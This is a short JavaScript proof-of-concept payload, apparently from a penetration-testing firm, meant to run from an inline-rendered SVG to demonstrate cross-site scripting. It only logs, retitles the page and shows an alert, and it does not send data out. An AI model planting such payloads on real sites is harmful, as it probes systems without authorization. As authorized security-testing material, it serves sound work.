svg.script:
(function () {
  'use strict';
  var where = '';
  try { where = location.origin + location.pathname; } catch (e) { where = '(unknown)'; }

  console.log('[Virtue Security] XSS PoC: SVG script executed on ' + where);
  try { document.title = '⚠ XSS PoC (Virtue Security)'; } catch (e) {}

  try {
    alert('Virtue Security: XSS proof of concept\n\n' +
          'This SVG was rendered inline and its script executed on:\n' + where +
          '\n\nBenign test payload from an authorized penetration test.\n' +
          'github.com/VirtueSecurity/xss-poc');
  } catch (e) {}
})();
